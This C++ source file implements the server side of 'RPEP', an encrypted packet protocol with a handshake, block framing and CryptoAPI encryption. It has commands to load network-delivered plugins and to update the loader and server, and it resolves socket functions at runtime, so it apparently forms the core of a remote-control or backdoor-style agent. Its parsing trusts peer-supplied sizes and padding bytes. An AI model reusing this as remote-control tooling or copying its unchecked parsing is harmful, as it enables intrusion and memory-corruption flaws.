#include "RPEP.h"
#include "PluginManager.h"
#include "plugininterface.h"

#define MinBlockSize 1024

RPEP::RPEP(SOCKET hConexion, HCRYPTKEY hKey, PluginManager *PlugMgr):ver(0,0){
    DebufPrintf("[pm] RPEP ctor \n");
    Port = NULL;
    CompresAlg = PortCount = 0;
    //ver = version(0,0);
    MaxPaquetSize = 4096*4;
    runing = true;
    ver.High = 1;
    ver.Low = 0;
    this->hKey = hKey;

    this->hConexion = hConexion;

    this->PlugMgr = PlugMgr;

    this->m_send=(t_send)GetProcAddress(LoadLibrary("WS2_32"),"send");
    this->m_recv=(t_recv)GetProcAddress(LoadLibrary("WS2_32"),"recv");
    this->m_ioctlsocket=(t_ioctlsocket)GetProcAddress(LoadLibrary("WS2_32"),"ioctlsocket");
    this->m_WSAGetLastError=(t_WSAGetLastError)GetProcAddress(LoadLibrary("WS2_32"),"WSAGetLastError");

}
RPEP::~RPEP(){}

ulong RPEP::clientLoop(){
    return 0;
}
ulong RPEP::serverLoop(){
    DebufPrintf("[pm] serverLoop \n");
    DArray readBuff,writeBuff,workBuff;
    char buff[4096];

    DebufPrintf("[pm] MakeServerHello \n");
    MakeServerHello(writeBuff);

    DebufPrintf("[pm] send MakeServerHello \n");
    m_send(hConexion,(char*)writeBuff.data(),writeBuff.size(),0);
    DebufPrintf("[pm] send data %d \n",(int)writeBuff.size());
    DebufPrintf("writeBuff.size %d \n",(int)writeBuff.size());
    //Cambio a modo asyncrono
    ulong async = true;
    m_ioctlsocket(hConexion,FIONBIO,&async);

    writeBuff.clear();
    int readBytes;
    do{
        for(readBytes = 0;(readBytes = recv(buff,sizeof(buff)))> 0;){
            //DebufPrintf("recv readBytes = %d\n",readBytes);
            //Concateno los datos hasta que no quede mas por recibir
            readBuff.addData(buff,readBytes);
            if(((uint)readBytes)<sizeof(buff))break;
        }
        if(readBytes == -1 || !readBytes){

            runing = false;
            continue;
        }
        //conexion.read(readBuff);
        //decript(readBuff);
        if(procesPkg(readBuff,writeBuff,workBuff)){
            if(writeBuff.size()){
                send(writeBuff.data(),writeBuff.size());
                writeBuff.clear();
                //conexion.write(writeBuff);
            }
        }
        Sleep(1);
    }while(runing);
    DebufPrintf("readBytes %x\n",readBytes);
    //Cambio a modo syncrono el socket
    async = false;
    m_ioctlsocket(hConexion,FIONBIO,&async);

    DebufPrintf("conexion cerrada\n");

    return 0;
}
int RPEP::send(const void* data,uint size){
    int result;
    DebufPrintf("[pm] send data: %x bytes\n",size);
    result = m_send(this->hConexion,(char*)data,size,0);
    DebufPrintf("[pm]datos enviados\n");
    return result;
}
uint RPEP::MakePacket(DArray &outBuff, RPEP_HEADER::Operation op, const void *data, ulong size){
    return MakePacket(outBuff,true,op,data,size);
}
uint RPEP::MakePacket(DArray &outBuff, ushort pluginID, const void *data, ulong size){
    return MakePacket(outBuff,false,pluginID,data,size);
}
uint RPEP::MakePacket(DArray &outBuff, bool IsOperation, ushort opOrIDCode, const void *data, ulong size){
    RPEP_HEADER header;
    DArray encriptBuff;

    encriptBuff.addData(data,size);
    //Compresion

    //Encriptacion
    encript(encriptBuff);

    //Aqui aparece el tipo de codificacion usada para el tamaño
    header.Size.bBlocks = size>MaxPaquetSize;
    //Indico el tipo de operacion
    header.opType.bOperation = IsOperation;

    header.opType.Operation = opOrIDCode;
    header.BlockIndex = 0;

    //Segun el tipo de tamaño usado se agrega de una u otra manera
    if(header.Size.bBlocks){
        header.Size.Blocks = size/MaxPaquetSize;
        //En caso de no caver en un solo paquete, lo voy dividiendo en trozos el contenido
        for(;header.BlockIndex<header.Size.Blocks;header.BlockIndex++){
            //Agrego la cabecera
            outBuff.addData(&header,sizeof(header));
            //Agrego los datos frgmentados
            outBuff.addData(((char*)encriptBuff.data())+header.BlockIndex*MaxPaquetSize,
                            ((((header.BlockIndex+1)*MaxPaquetSize)<=encriptBuff.size())?MaxPaquetSize:encriptBuff.size()%MaxPaquetSize));
        }

    }else{
        //Tamaño por bytes
        header.Size.Bytes = encriptBuff.size();
        outBuff.addData(&header,sizeof(header));
        outBuff.addData(encriptBuff.data(),encriptBuff.size());
    }
    //Mensajes de depuracion
    //DebufPrintf("header.Size.Bytes %d \nheader.opType.bOperation %d \n",(int)header.Size.Bytes,(int)header.opType.bOperation);
    DebufPrintf("mkPkg\n\tsize %x\n\toriginalSize %x\n\tbOperation %x\n\tcode %x\n",(uint)header.Size.Bytes,(uint)size,(uint)header.opType.bOperation,(uint)header.opType.Operation);
    return 0;
}


uint RPEP::MakeServerHello(DArray& outBuff){
    static ulong* CompresAlg = null;
    ulong CompresAlgCount = 0;
    register RPEP_SERVER_HANDSHAKE* sHello;

    //calculamos el tamaño dl buffer para contener al ServerHello
    uint buffSize = sizeof(RPEP_SERVER_HANDSHAKE)
            +CompresAlgCount*sizeof(*sHello->SupportedCompressionAlgm);
    //Buffert en pila para el hello
    char* buff = (char*)malloc(buffSize);
    sHello = (RPEP_SERVER_HANDSHAKE*)buff;

    //Inicializo el hello
    *((version*)&sHello->Version) = ver;
    sHello->MaxBlockSize = MaxPaquetSize;
    sHello->SupportedCompressionAlgmCount = CompresAlgCount;
    if(CompresAlgCount)
        memcpy(sHello->SupportedCompressionAlgm,
               CompresAlg,
               CompresAlgCount*sizeof(*sHello->SupportedCompressionAlgm));


    MakePacket(outBuff,RPEP_HEADER::Operation::ServerHandshake,buff,buffSize);

    free(buff);
    return outBuff.size();
}
uint RPEP::MakeError(DArray& outBuff,uint code){
    RPEP_ERROR error;

    ZeroMemory(&error,sizeof(error));
    error.Code = code;

    return MakePacket(outBuff,RPEP_HEADER::Operation::Error,&error,sizeof(error));
}

bool RPEP::procesPkg(DArray& in, DArray& out, DArray &workBuff){
    DebufPrintf("[pm] procesPkg \n");
    bool result = true;
    uint bytesRead = 0;
    RPEP_HEADER* header = 0;

    //Pasamos los datos al buffer de trabajo
    while(bytesRead < in.size()){
        header = (RPEP_HEADER*)(((byte*)in.data())+bytesRead);
        if(header->Size.bBlocks){
            //Si no hay datos suficientes salimos
            if((in.size()-bytesRead)<(MaxPaquetSize+sizeof(RPEP_HEADER)))break;
            ///////////////////////////////////////////////////////
            //mensages de depuracion
            DebufPrintf("procesPkg \n");
            DebufPrintf("header \n\tbBlocks %x\n\tOperation %x\n",(uint)header->Size.bBlocks,(uint)header->opType.Operation);
            /////////////////////////////////////////////////////////
            //Voy acumulando los datos hasta tener suficientes
            if(workBuff.size()){
                workBuff.addData(in.data(),MaxPaquetSize+sizeof(RPEP_HEADER));
            }else{
                workBuff.addData(header->Data,MaxPaquetSize);
                header = (RPEP_HEADER*)workBuff.data();

                if(workBuff.size() >= (header->Size.Blocks*MaxPaquetSize+sizeof(RPEP_HEADER))){
                    //Proceso el comando
                    ulong dataSize = decript((byte*)header->Data,header->Size.Blocks*MaxPaquetSize);
                    if(dataSize != (uint)-1){
                        procesCMD(header->opType,header->Data,dataSize,out);
                        DebufPrintf("[pm] procesPkg workBuff.Vaciar() antes\n");
                        workBuff.clear();
                        DebufPrintf("[pm] procesPkg workBuff.Vaciar() despues\n");
                    }
                }
            }
            bytesRead += MaxPaquetSize+sizeof(RPEP_HEADER);
        }else{
            //Si no hay datos suficientes salimos
            if((in.size()-bytesRead)<header->Size.Bytes)break;
            //Compruevo que lo recibido sea acorde con lo esperado
            if(header->Size.Bytes > in.size()){
                bytesRead = -1;
                break;
            }
            ///////////////////////////////////////////////////////
            //mensages de depuracion
            DebufPrintf("procesPkg \n");
            DebufPrintf("header \n\tbBlocks %x\n\tOperation %x\n\n\tSize %x\n",(uint)header->Size.bBlocks,(uint)header->opType.Operation,(uint)header->Size.Bytes);
            /////////////////////////////////////////////////////////

            //Se procesa el comando
            ulong dataSize = decript((byte*)header->Data,header->Size.Bytes);
            if(dataSize != (uint)-1){
                procesCMD(header->opType,header->Data,dataSize,out);
            }
            //Se aumenta el indicador de bytes procesados
            bytesRead += header->Size.Bytes+sizeof(RPEP_HEADER);
        }
    }
    //limpio el buffer
    if(in.size() <= bytesRead){
        in.clear();
    }else{
        in.remove(0,bytesRead);
    }
    DebufPrintf("[pm] procesPkg end\n");
    return result;
}
bool RPEP::procesCMD(RPEP_HEADER::OperationType opType, char* data,uint size,DArray& response){
    bool result = false;

    DebufPrintf("[pm] procesCMD \n");
    if(opType.bOperation){
        DebufPrintf("comando interno\n");
        switch(opType.Operation){
            case RPEP_HEADER::Operation::ClientHandshake:
                DebufPrintf("ClientHandshake \n");
                processClientHello((RPEP_CLIENT_HANDSHAKE*)data,response);
                break;
            case RPEP_HEADER::Operation::ServerHandshake:
                DebufPrintf("ServerHandshake \n");
                break;
            case RPEP_HEADER::Operation::SetBlockSize:
                DebufPrintf("SetBlockSize \n");
                break;
            case RPEP_HEADER::Operation::SetCompressionAlgm:
                DebufPrintf("SetCompressionAlgm \n");
                break;
            case RPEP_HEADER::Operation::PingRequest:
                DebufPrintf("PingRequest \n");
                break;
            case RPEP_HEADER::Operation::PingResponse:
                DebufPrintf("PingResponse \n");
                break;
            case RPEP_HEADER::Operation::Error:
                DebufPrintf("Error \n");
                break;
            //
            case RPEP_HEADER::Operation::LoadPlugin:
                DebufPrintf("LoadPlugin \n");
                result = PlugMgr->loadPlugin((RPEP_LOAD_PLUGIN*)data);
                break;
            case RPEP_HEADER::Operation::CancelPluginLoad:
                DebufPrintf("CancelPluginLoad \n");
               break;
            case RPEP_HEADER::Operation::InitPlugin:
                DebufPrintf("InitPlugin \n");
               break;
            case RPEP_HEADER::Operation::StopPlugin:
                DebufPrintf("StopPlugin \n");
               break;
            case RPEP_HEADER::Operation::UnloadPlugin:
                DebufPrintf("UnloadPlugin \n");
               break;
            case RPEP_HEADER::Operation::EnumLoadedPlugins:
                DebufPrintf("EnumLoadedPlugins \n");
               break;
            //
            case RPEP_HEADER::Operation::UpdateLoader:
                DebufPrintf("UpdateLoader \n");
               break;
            case RPEP_HEADER::Operation::UpdateServer:
                DebufPrintf("UpdateServer \n");
               break;
            case RPEP_HEADER::Operation::StopServer:
                DebufPrintf("StopServer \n");
               break;
            default:
                DebufPrintf("default \n");
               //Desconocido
               ;
        }
    }else{
        DebufPrintf("comando para plugin\n");
        PlugMgr->runPluginCMD(opType.PluginID,data,size);
    }
    DebufPrintf("[pm] procesCMD end\n");
    return result;
}

bool RPEP::processClientHello(RPEP_CLIENT_HANDSHAKE *clientHello,DArray& response){
    bool result = false;
    int error = -1;
    if(clientHello){
       //MessageBox(0,"pause","pause",0);
       DebufPrintf("ClientHello \n\tMaxBlockSize %x\n\tPortCount %x\n\tCompressionALGM %x\n\tVersion %x.%x\n",
              clientHello->MaxBlockSize,
              (uint)clientHello->PortCount,
              (uint)clientHello->CompressionALGM,
              (uint)clientHello->Version.High,
              (uint)clientHello->Version.Low);

       if(clientHello->MaxBlockSize >= MinBlockSize && (ver.High >= clientHello->Version.High)
               && (ver.Low >= clientHello->Version.Low)){

           ver.High = clientHello->Version.High;
           ver.Low = clientHello->Version.Low;
           setMaxPaquetSize(clientHello->MaxBlockSize);

           setPort(clientHello->Port,clientHello->PortCount);
           setCompresAlg(clientHello->CompressionALGM);

           error = 0;
       }
       MakeError(response,error);
    }
    return result;
}


void RPEP::setMaxPaquetSize(ulong s){
    MaxPaquetSize = (ushort)s;
}

void RPEP::setCompresAlg(ulong CompresAlg){
    this->CompresAlg = CompresAlg;
}

void RPEP::setPort(ushort *Port, ulong count){
    if(count && Port){
        this->Port = (ushort*)malloc(count*sizeof(*Port));
        memcpy(this->Port,Port,count*sizeof(*Port));
    }
}


bool RPEP::encript(DArray &data){
    if(data.size()){
        //Coloco el paddingpo
        int buffSize = ((data.size()>>4)+1)<<4;
        data.Expand(buffSize);

        return CryptEncrypt(hKey,0,true,0,(byte*)data.data(),&data.rSize(),buffSize) != 0;
    }
    return false;
}

uint RPEP::decript(byte* data,ulong size){
    uint newSize = -1;
    if(size){
        ulong szData = size;
        if(CryptDecrypt(hKey,0,true,0,data,&szData)){
            //Calculo el nuevo tamaño de los datos descifrados
            /*
             *El relleno del padding es el tamaño del mismo por lo que en el ultimo byte de los datos,
             *se encuentra el tamaño del padding
            **/
            newSize = size - data[size-1];
            ZeroMemory(data+newSize,data[size-1]);
        }
    }
    return newSize;
}


int RPEP::recv(char *data, uint size){
    DebufPrintf("[pm] recv \n");
    int recvedData = 0;

    while(!recvedData){
        m_ioctlsocket(hConexion,FIONREAD,(ulong*)&recvedData);
        //DebufPrintf("[pm] recvedData %x\n",recvedData);

        if(recvedData > 0){
            DebufPrintf("[pm] recv readData\n");
            recvedData = m_recv(hConexion,data,size,0);
        }else{
            //DebufPrintf("[pm] recv no data\n");
            recvedData = m_recv(hConexion,0,0,MSG_PEEK);
            if(recvedData == -1){
                //DebufPrintf("[pm] recv WSAGetLastError\n");
                ulong error = m_WSAGetLastError();
                switch(error){
                    case WSAEWOULDBLOCK:
                        recvedData = 0;
                        Sleep(10);
                        break;
                    case WSAECONNRESET:
                        //Conexion cerrada
                        return recvedData;
                    default:
                        DebufPrintf("Error recv desconocido %x\n",(uint)error);
                        break;
                }
            }
        }
    }


    return recvedData;
}
